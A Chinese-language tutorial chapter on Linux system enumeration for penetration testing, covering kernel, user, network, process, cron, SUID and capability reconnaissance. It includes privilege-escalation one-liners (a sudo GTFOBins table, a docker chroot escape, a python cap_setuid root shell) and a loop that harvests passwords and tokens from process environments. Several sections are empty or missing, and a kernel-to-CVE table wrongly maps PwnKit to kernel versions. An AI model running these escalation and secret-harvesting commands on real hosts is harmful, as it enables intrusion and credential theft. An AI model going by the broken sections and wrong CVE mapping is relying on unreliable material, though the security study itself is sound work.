## 二、系统信息收集

在渗透测试和安全评估中，系统信息收集是攻击链的第一步，也是蓝队日常巡检的核心环节。攻击者拿到一台机器的立足点后，首要任务不是急着提权或横向移动，而是**摸清环境**——操作系统版本、内核漏洞窗口、用户权限边界、网络拓扑、运行中的服务，每一项信息都直接影响后续攻击路径的选择。

对于防守方而言，理解攻击者如何收集信息，才能设计出有效的监控和欺骗策略。一份完整的系统信息收集清单，既是红队的攻击手册，也是蓝队的巡检指南。

### 2.1 基本系统信息

#### 2.1.1 内核版本

内核版本是提权攻击的核心参考。不同内核版本对应不同的提权漏洞窗口，攻击者拿到内核版本后会立刻匹配已知漏洞库。

```bash
# 完整内核信息（最常用，一行搞定）
uname -a
# 输出示例: Linux webserver 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

# 从 /proc 读取（包含编译器信息，可判断是否打了补丁）
cat /proc/version
# 输出示例: Linux version 5.15.0-91-generic (buildd@lcy02-amd64-046) 
#           (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld ...) 
```

**关键字段解读：**

| 字段 | 含义 | 安全意义 |
|------|------|----------|
| `5.15.0-91-generic` | 内核主版本+补丁号 | 可匹配 DirtyPipe(CVE-2022-0847) 等漏洞 |
| `x86_64` / `aarch64` | CPU 架构 | 决定 payload 编译目标 |
| `SMP` | 对称多处理支持 | 无直接安全意义 |
| `Ubuntu` / `Debian` | 发行版内核标识 | 影响包管理和补丁策略 |

**提权漏洞快速匹配示例：**

- `5.8 <= kernel < 5.16.11`、`5.15.25` → DirtyPipe (CVE-2022-0847)
- `2.6.22 <= kernel < 3.9` → DirtyCow (CVE-2016-5195)
- `3.13 <= kernel < 3.19` → overlayfs 提权 (CVE-2015-1328)
- `kernel < 5.4.0` (Ubuntu特定补丁) → PwnKit (CVE-2021-4034)

#### 2.1.2 发行版信息

发行版决定了包管理系统、默认配置、安全策略和可用工具链。

```bash
# 推荐方式：读取 os-release（systemd 标准，几乎所有现代发行版都有）
cat /etc/os-release
# 输出示例:
# PRETTY_NAME="Ubuntu 22.04.3 LTS"
# NAME="Ubuntu"
# VERSION_ID="22.04"
# ID=ubuntu

# 备用方式
lsb_release -a          # 需要 lsb-release 包
cat /etc/redhat-release  # RHEL/CentOS 专用
cat /etc/debian_version  # Debian 专用
hostnamectl              # systemd 系统，含操作系统和内核信息
```

**发行版与包管理对应关系：**

| 发行版家族 | 包管理器 | 更新命令 | 日志路径 |
|------------|----------|----------|----------|
| Debian/Ubuntu | apt/dpkg | `apt update && apt upgrade` | `/var/log/apt/` |
| RHEL/CentOS/Fedora | yum/dnf | `yum update` | `/var/log/yum.log` |
| Arch Linux | pacman | `pacman -Syu` | `/var/log/pacman.log` |
| Alpine | apk | `apk update && apk upgrade` | 无专用日志 |
| SUSE | zypper | `zypper update` | `/var/log/zypper.log` |

#### 2.1.3 系统运行时间和负载

运行时间反映了系统稳定性，也能间接判断是否是刚部署的新机器（安全策略可能未完善）。负载信息暴露了系统当前压力，高负载时段往往意味着安全监控可能被忽视。

```bash
# 运行时间和平均负载
uptime
# 输出:  14:23:01 up 45 days, 3:22,  2 users,  load average: 0.15, 0.10, 0.05
#                                    ↑ 运行天数                ↑ 1/5/15分钟平均负载

# 更详细的启动和关机历史
last reboot | head -10
who -b      # 最后一次启动时间
```

**负载解读：** load average 的三个数字分别代表 1分钟、5分钟、15分钟的平均可运行进程数。对于单核系统，>1 意味着有进程在排队；多核系统应除以核心数。攻击者会关注高负载时段——系统忙碌时管理员更难注意到异常进程。

#### 2.1.4 主机名和系统标识

主机名经常包含环境信息（prod/staging/dev）、地理位置、服务用途等。

```bash
hostname
hostname -f        # 完整域名（FQDN）
cat /etc/hostname
dnsdomainname      # DNS 域名部分
```

**命名规律分析示例：**
- `web-prod-01` → 生产环境 Web 服务器第 1 台
- `dev-db-cn-east` → 开发环境数据库，华东区
- `k8s-node-3` → Kubernetes 第 3 个节点

这些信息帮助攻击者快速定位高价值目标。

#### 2.1.5 硬件信息

了解硬件配置有助于判断目标机器的用途和价值，也能发现虚拟化/容器环境。

```bash
# CPU 信息
lscpu
# 重点关注: Architecture (架构), CPU(s) (核心数), Model name (型号)
cat /proc/cpuinfo

# 内存信息
free -h
# 重点关注: total (总内存), available (可用内存)
cat /proc/meminfo

# 磁盘信息
lsblk                  # 块设备树状结构（最清晰）
df -h                  # 已挂载文件系统使用率
fdisk -l               # 分区表详情（需root）
blkid                  # 块设备UUID和文件系统类型

# PCI设备（显卡、网卡等硬件清单）
lspci 2>/dev/null
# USB设备
lsusb 2>/dev/null
```

**虚拟化环境检测：**

```bash
# 方法一：检查 DMI 信息
sudo dmidecode -s system-product-name
# VMware: "VMware Virtual Platform"
# KVM/QEMU: "Standard PC (Q35 + ICH9, 2009)"
# Docker/LXC: 可能报错或返回宿主信息

# 方法二：检查特定文件
cat /proc/1/cgroup 2>/dev/null | grep -q docker && echo "Docker 容器"
[ -f /.dockerenv ] && echo "Docker 容器"
systemd-detect-virt 2>/dev/null

# 方法三：检查虚拟化特征文件
ls -la /dev/disk/by-id/  # VMware 会显示 "VMware_Virtual" 前缀
cat /sys/class/dmi/id/product_name 2>/dev/null
```

判断是否在容器/虚拟机中很重要——容器内的逃逸路径与虚拟机完全不同。

### 2.2 用户与权限信息

用户信息收集的核心目的是回答三个问题：**我是谁、谁能做什么、谁能登录进来**。

#### 2.2.1 当前用户身份

```bash
whoami              # 当前用户名
id                  # 完整身份信息（UID/GID/附加组）
# 输出示例: uid=1001(webuser) gid=1001(webuser) groups=1001(webuser),27(sudo),33(www-data)

# 查看当前用户的所有组（决定了文件访问权限）
groups
# 查看特定用户的组
groups username
```

**`id` 输出关键字段：**

| 字段 | 含义 | 安全意义 |
|------|------|----------|
| `uid=0(root)` | root 用户 | 拥有系统最高权限 |
| `groups=27(sudo)` | 属于 sudo 组 | 可通过 sudo 提权到 root |
| `groups=33(www-data)` | Web 服务组 | 可读写 Web 目录 |
| `groups=998(docker)` | docker 组 | 可直接提权到 root（通过特权容器） |

> **安全提示：** `docker` 组的成员等价于 root 权限。攻击者一旦发现当前用户在 docker 组中，提权路径就非常直接：`docker run -v /:/host --rm -it alpine chroot /host`。

#### 2.2.2 用户枚举

```bash
# 所有用户（/etc/passwd 世界可读）
cat /etc/passwd

# 过滤可登录用户（排除 nologin 和 false 的 shell）
grep -v "nologin\|false\|sync\|halt\|shutdown" /etc/passwd

# 格式: 用户名:密码占位:UID:GID:备注:家目录:Shell
# 重点关注字段:
# - UID=0: 超级用户（正常应只有 root）
# - Shell 为 /bin/bash 或 /bin/sh: 可交互登录
# - 家目录存在: 该用户可能活跃

# 查找 UID=0 的隐藏超级用户（后门常见手法）
awk -F: '$3 == 0 {print $1}' /etc/passwd
# 如果输出多个用户名，说明有后门账户

# 查找空密码账户（严重安全隐患）
sudo awk -F: '($2 == "" || $2 == "!" || $2 == "*") {print $1, $2}' /etc/shadow
# "" = 空密码, "!" = 锁定, "*" = 禁用

# 查找非系统用户（UID >= 1000）
awk -F: '$3 >= 1000 && $3 < 65534 {print $1, $3, $7}' /etc/passwd
```

#### 2.2.3 登录历史与会话

```bash
# 最近登录历史（来自 /var/log/wtmp）
last -20
# 输出: 用户名 终端 来源IP 登录时间 - 登出时间 (持续时间)

# 最近失败登录（来自 /var/log/btmp，需 root）
sudo lastb -20

# 所有用户的最后登录时间（来自 /var/log/lastlog）
sudo lastlog

# 当前在线用户
who                 # 简洁版
w                   # 详细版（含负载和当前进程）
```

**攻击者视角：**
- `last` 中的来源 IP 暴露了管理员常登录的地址，可用于横向移动
- `lastb` 中的失败登录暴露了爆破痕迹和常用用户名
- `w` 中的 `FROM` 列显示当前 SSH 连接来源

#### 2.2.4 sudo 权限分析

```bash
# 查看当前用户的 sudo 权限
sudo -l
# 输出示例:
# User webuser may run the following commands on webserver:
#     (root) /usr/bin/systemctl restart nginx
#     (root) NOPASSWD: /usr/bin/vim
```

**sudo 提权分析要点：**

```bash
# 1. 检查是否可以直接 sudo bash
sudo -l | grep -E "(ALL|/bin/bash|/bin/sh)"

# 2. 检查可利用的程序（GTFOBins 高危程序）
sudo -l | grep -E "(vim|vi|nano|less|more|man|awk|find|nmap|python|perl|ruby|lua|php|node|env|ftp|ssh|tar|zip|docker|apt|yum|pip)"

# 3. 检查 NOPASSWD（无需密码即可执行）
sudo -l | grep NOPASSWD
```

**常见 sudo 提权路径：**

| 程序 | 提权命令 | 原理 |
|------|----------|------|
| vim/vi | `sudo vim -c ':!/bin/bash'` | vim 可执行 shell 命令 |
| less/more | `sudo less /etc/shadow` → 输入 `!/bin/bash` | less 支持 ! 命令 |
| find | `sudo find / -exec /bin/bash \;` | find 的 -exec 参数 |
| awk | `sudo awk 'BEGIN {system("/bin/bash")}'` | awk 的 system() 函数 |
| nmap | `sudo nmap --interactive` → `!sh` | nmap 交互模式支持 shell |
| python | `sudo python -c 'import os; os.system("/bin/bash")'` | 执行任意代码 |
| env | `sudo env /bin/bash` | env 可直接运行程序 |
| apt | `sudo apt-get changelog apt` → `!/bin/bash` | apt 通过 apt-get 执行 |
| docker | `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash` | 容器挂载宿主根 |

完整提权参考见 [GTFOBins](https://gtfobins.github.io/)。

### 2.3 网络信息

网络信息决定了攻击面的大小——有多少个网段可达、哪些服务在监听、防火墙放行了什么。

#### 2.3.1 网络接口和地址

```bash
# 推荐方式（ip 命令是现代标准）
ip addr show
ip -br addr show      # 简洁模式，一行一个接口

# 旧命令（部分最小化系统未安装）
ifconfig

# 提取所有 IP 地址
ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
# 输出示例: 127.0.0.1, 10.0.2.15, 172.17.0.1

# 提取所有 MAC 地址
ip link show | grep -oP '(?<=link/ether\s)[0-9a-f:]+'
```

**网络信息安全分析：**

```bash
# 检查是否有多网卡（可能连接多个网段，便于横向移动）
ip -br link show | grep -v "lo" | wc -l
# 输出 > 1 说明有多个网络接口

# 检查是否有混杂模式接口（可能是抓包工具）
ip link show | grep -i promisc

# 检查无线接口
iwconfig 2>/dev/null | grep -v "no wireless"
```

#### 2.3.2 路由表

```bash
# 路由表（了解网络拓扑）
ip route show
route -n             # 旧命令

# 默认网关（出口流量走向）
ip route | grep default
# 输出: default via 10.0.2.2 dev eth0 proto dhcp metric 100

# 特定网段的路由
ip route get 192.168.1.100
```

**路由分析要点：** 路由表中的每个条目代表一条可达网段。`default via X` 指向网关——网关设备通常是路由器或防火墙，是高价值目标。

#### 2.3.3 DNS 配置

```bash
# DNS 服务器
cat /etc/resolv.conf
# nameserver 8.8.8.8
# nameserver 1.1.1.1

# 本地 hosts 文件（可能有自定义解析）
cat /etc/hosts
# 常见: 127.0.0.1 localhost
# 异常: 192.168.1.100 bank.com  ← 可能是钓鱼或劫持

# systemd-resolved 配置（现代系统）
resolvectl status 2>/dev/null
```

**攻击者关注点：**
- `/etc/hosts` 中的自定义条目暴露了内部服务地址
- DNS 服务器如果是内网地址，说明有内部 DNS 基础设施
- 搜索域（`search` 行）暴露了内部域名结构

#### 2.3.4 网络连接与监听端口

```bash
# === 监听端口（攻击面评估）===
ss -tlnp              # TCP 监听，显示进程
ss -ulnp              # UDP 监听
# 标志: -t (TCP), -u (UDP), -l (监听), -n (数字显示), -p (进程信息)

# netstat 替代（旧系统）
netstat -tlnp 2>/dev/null

# === 所有活跃连接（横向移动分析）===
ss -tnp               # TCP 连接
ss -tunp              # TCP + UDP

# === 按状态分类连接 ===
ss -s                 # 连接统计摘要
# 输出: Total: 156, TCP: 45 (estab 32, closed 8, orphaned 0, ...)
```

**端口分析矩阵：**

```bash
# 提取所有监听端口（快速总览）
ss -tlnp | awk 'NR>1 {print $4}' | grep -oP ':\K[0-9]+' | sort -n | uniq

# 查找绑定到 0.0.0.0 的服务（对外暴露）
ss -tlnp | grep "0.0.0.0:\|*:" | awk '{print $4, $6}'

# 查找绑定到 127.0.0.1 的服务（仅本地，可能需要端口转发才能访问）
ss -tlnp | grep "127.0.0.1:" | awk '{print $4, $6}'
```

| 端口 | 常见服务 | 安全关注度 |
|------|----------|------------|
| 22 | SSH | 高 - 爆破和密钥泄露 |
| 80/443 | HTTP/HTTPS | 高 - Web 应用漏洞 |
| 3306 | MySQL | 高 - 数据库泄露 |
| 6379 | Redis | 极高 - 默认无认证 |
| 27017 | MongoDB | 极高 - 默认无认证 |
| 9200 | Elasticsearch | 高 - 默认无认证 |
| 2375/2376 | Docker API | 极高 - 容器逃逸 |
| 8500 | Consul | 高 - RCE 漏洞 |
| 8080 | Tomcat/代理 | 中 - 常见应用端口 |

#### 2.3.5 防火墙规则

```bash
# iptables（传统）
sudo iptables -L -n -v           # filter 表
sudo iptables -t nat -L -n -v    # NAT 表（端口转发规则）
sudo iptables -t mangle -L -n -v # mangle 表

# nftables（现代替代）
sudo nft list ruleset 2>/dev/null

# firewalld（RHEL/CentOS 默认）
sudo firewall-cmd --list-all 2>/dev/null

# ufw（Ubuntu 默认）
sudo ufw status verbose 2>/dev/null
```

**防火墙规则分析要点：** NAT 表中的 DNAT 规则暴露了端口转发映射（比如将外部 8080 转发到内部 192.168.1.100:80），这是横向移动的关键情报。

#### 2.3.6 ARP 缓存与邻居表

```bash
# ARP 缓存（同一网段的活跃主机）
ip neigh show
arp -a 2>/dev/null

# 输出示例:
# 10.0.2.2 dev eth0 lladdr 52:54:00:12:35:02 REACHABLE
# 10.0.2.3 dev eth0 lladdr 52:54:00:12:35:03 STALE
```

ARP 缓存暴露了同一广播域中的活跃主机。结合 MAC 地址前缀（OUI），可以判断设备厂商（如 `00:50:56` 是 VMware）。

### 2.4 进程与服务信息

进程信息回答了"系统正在做什么"——运行的服务、使用的账户、配置文件路径、环境变量中的秘密。

#### 2.4.1 进程枚举

```bash
# 所有进程（最常用）
ps aux                # BSD 风格（含 CPU/内存使用率）
ps -ef                # System V 风格（含父进程PID）

# 进程树（清晰展示父子关系）
pstree -p
ps auxf               # 带缩进的森林视图

# 按资源排序
ps aux --sort=-%cpu | head -15    # CPU 占用 Top 15
ps aux --sort=-%mem | head -15    # 内存占用 Top 15
```

**进程分析安全要点：**

```bash
# 查找以 root 运行的进程（高价值目标）
ps aux | awk '$1 == "root" && $11 !~ /^\[/ {print $0}'

# 查找非标准路径的进程（可能是恶意程序）
ps aux | awk '{print $11}' | grep -v -E "^(/usr/|/bin/|/sbin/|/lib/|\[)" | sort -u

# 查找包含敏感参数的进程（密码泄露）
ps aux | grep -iE "(pass|passwd|password|token|secret|key|api)" | grep -v grep
# 例如: java -jar app.jar --db-password=MySecret123
```

#### 2.4.2 进程深度分析（/proc 文件系统）

`/proc` 是 Linux 的虚拟文件系统，每个运行中的进程在 `/proc/[PID]/` 下都有对应目录，包含大量未经过滤的原始信息。

```bash
# 进程启动命令（完整参数）
cat /proc/[PID]/cmdline | tr '\0' ' '
# 命令行参数经常包含密码、API Key、配置路径

# 进程环境变量（极易泄露敏感信息）
cat /proc/[PID]/environ | tr '\0' '\n'
# 常见泄露: DB_PASSWORD, API_KEY, SECRET_TOKEN, AWS_ACCESS_KEY

# 进程打开的文件描述符
ls -la /proc/[PID]/fd/
# 可以看到进程打开了哪些文件、socket 连接

# 进程的内存映射（查找加载的库和配置文件路径）
cat /proc/[PID]/maps | head -30
# 可以看到程序加载的 .so 库路径，判断是否使用了特定版本

# 进程的工作目录
readlink /proc/[PID]/cwd

# 进程的可执行文件路径
readlink /proc/[PID]/exe

# 进程的网络连接
cat /proc/[PID]/net/tcp
ss -tnp | grep "pid=[PID]"
```

**批量提取所有进程的环境变量中的敏感信息：**

```bash
# 扫描所有进程的环境变量，查找密码/密钥
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    env=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | \
          grep -iE "(pass|key|token|secret|api)" 2>/dev/null)
    if [ -n "$env" ]; then
        echo "=== PID $pid ($(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')) ==="
        echo "$env"
    fi
done
```

#### 2.4.3 服务和守护进程

```bash
# systemd 服务列表（现代 Linux 标准）
systemctl list-units --type=service --state=running
systemctl list-units --type=service --all    # 包含未运行的

# 查看特定服务的详细配置
systemctl cat nginx.service
# 显示 unit 文件内容，包含执行命令、用户、权限等

# 服务依赖关系
systemctl list-dependencies nginx.service

# 旧式 init 脚本（兼容层）
ls /etc/init.d/
service --status-all 2>/dev/null

# 查看自启动服务
systemctl list-unit-files --state=enabled
```

**服务安全分析：**

```bash
# 查找以非 root 用户运行的服务（安全配置较好）
systemctl list-units --type=service --state=running | while read name rest; do
    user=$(systemctl show "$name" -p User --value 2>/dev/null)
    [ -n "$user" ] && [ "$user" != "root" ] && echo "$name: $user"
done

# 查找服务的监听端口
ss -tlnp | while read line; do
    pid=$(echo "$line" | grep -oP 'pid=\K[0-9]+')
    [ -n "$pid" ] && service=$(ps -p $pid -o comm= 2>/dev/null) && \
    echo "$service (PID $pid): $(echo $line | awk '{print $4}')"
done
```

### 2.5 定时任务与自动化

定时任务是持久化后门的经典手法，也是合法自动化运维的常见机制。审查定时任务是攻防双方的关键步骤。

#### 2.5.1 Cron 定时任务

```bash
# 当前用户的 cron 任务
crontab -l

# 所有用户的 cron 任务（需 root）
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -l -u "$user" 2>/dev/null && echo "=== $user ==="
done

# 系统级 cron 目录（更常被忽略）
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
cat /etc/crontab    # 系统主 crontab

# cron 日志
grep -i cron /var/log/syslog 2>/dev/null | tail -20
journalctl -u cron --since "1 hour ago" 2>/dev/null
```

**Cron 格式：**

```text
分 时 日 月 周 用户 命令
*  *  *  *  *  root /usr/local/bin/backup.sh
│  │  │  │  │
│  │  │  │  └─ 星期 (0-7, 0和7都是周日)
│  │  │  └──── 月份 (1-12)
│  │  └─────── 日期 (1-31)
│  └────────── 小时 (0-23)
└───────────── 分钟 (0-59)
```

**Cron 攻击手法：**

```bash
# 1. 检查 cron 脚本是否可写（可注入恶意命令）
for f in /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/*; do
    [ -w "$f" ] && echo "可写: $f"
done

# 2. 检查 cron 中引用的脚本是否可写
grep -r "" /etc/cron.d/ /etc/crontab 2>/dev/null | \
    awk '{print $NF}' | xargs -I{} ls -la {} 2>/dev/null | grep "w"

# 3. 检查 cron 命令中使用的 PATH 是否可被劫持
# 如果 cron 使用了相对路径（如 backup.sh 而非 /usr/bin/backup.sh），
# 攻击者可以在 PATH 中靠前的目录放置同名恶意程序
```

#### 2.5.2 Systemd Timer

```bash
# systemd timer 是 cron 的现代替代
systemctl list-timers --all
# 输出: NEXT/LAST 触发时间、UNIT 对应的 service、描述

# 查看特定 timer 的配置
systemctl cat example.timer
```

#### 2.5.3 其他持久化机制

```bash

at -c [任务号]       # 查看任务内容

# /etc/rc.local（启动时执行）

# 用户级自启动（XDG autostart）
```

#### 2.6.3 SUID/SGID 二进制文件

SUID 文件以文件所有者的权限运行，而非调用者的权限。SUID root 文件是提权的黄金目标。

```bash
# 查找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 查找所有 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 查找同时设置了 SUID 和 SGID 的
find / -perm -6000 -type f 2>/dev/null

# 查找可被当前用户写入的 SUID 文件（可替换为恶意程序）
find / -perm -4000 -type f -writable 2>/dev/null
```

**正常 SUID 文件白名单（可排除的安全文件）：**

| 路径 | 用途 |
|------|------|
| `/usr/bin/passwd` | 修改密码 |
| `/usr/bin/sudo` | 权限提升 |
| `/usr/bin/su` | 切换用户 |
| `/usr/bin/chsh` | 修改 Shell |
| `/usr/bin/chfn` | 修改用户信息 |
| `/usr/bin/newgrp` | 切换主组 |
| `/usr/bin/gpasswd` | 组密码管理 |
| `/usr/bin/mount` / `umount` | 挂载/卸载 |
| `/usr/bin/pkexec` | PolicyKit（CVE-2021-4034 PwnKit） |
| `/usr/lib/openssh/ssh-keysign` | SSH 主机认证 |

不在白名单中的 SUID 文件是重点审查对象。可用 [GTFOBins](https://gtfobins.github.io/#suid) 查询利用方式。

#### 2.6.4 文件能力（Capabilities）

Linux Capabilities 是比 SUID 更细粒度的权限机制，同样可被滥用。

```bash
# 查找所有设置了 capabilities 的文件
getcap -r / 2>/dev/null

# 常见危险 capabilities:
# cap_setuid     → 可以设置 UID（等效于 SUID）
# cap_setgid     → 可以设置 GID
# cap_dac_override → 绕过文件权限检查
# cap_sys_admin   → 等效于 root
# cap_net_raw     → 原始套接字（抓包）
# cap_sys_ptrace  → 调试其他进程（注入恶意代码）
```

**利用示例：** 如果 `python3` 被设置了 `cap_setuid`：

```bash
# 直接提权
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### 2.7.3 内核模块和驱动


### 2.11 防御视角：监控与欺骗

#### 2.11.1 信息收集行为检测

作为防守方，应监控以下信息收集行为的特征：


### 2.12 常见误区

| 误区 | 纠正 |
|------|------|
| 只看 `uname -a` 就够了 | 内核版本需要结合发行版补丁策略判断，Ubuntu 的内核版本号不等于上游内核版本号 |
| `ifconfig` 是标准命令 | `ifconfig` 来自 net-tools 包，许多最小化安装不包含它；应优先使用 `ip` 命令 |
| `/etc/passwd` 存储密码 | 现代 Linux 密码存储在 `/etc/shadow`（需 root 读取），passwd 中的 `x` 只是占位符 |
| `sudo -l` 一定能显示权限 | 部分配置下 sudo -l 也需要密码，且 `!authenticate` 标记只在特定 sudoers 配置下生效 |
| SUID 文件都是危险的 | 标准 SUID 文件（passwd、sudo 等）是正常系统组件，只有非白名单的 SUID 文件才值得重点关注 |
| `ss` 和 `netstat` 输出一样 | `ss` 基于 netlink 直接读取内核数据，`netstat` 解析 /proc/net；`ss` 更快更准确，`netstat` 可能遗漏连接 |
| 环境变量不会泄露信息 | CI/CD 环境、Docker 容器、systemd 服务中经常通过环境变量传递密码和 API Key |
| 容器内无法看到宿主信息 | 共享 PID 命名空间、特权容器、挂载了 /proc 或 /sys 的容器都可以泄露宿主信息 |
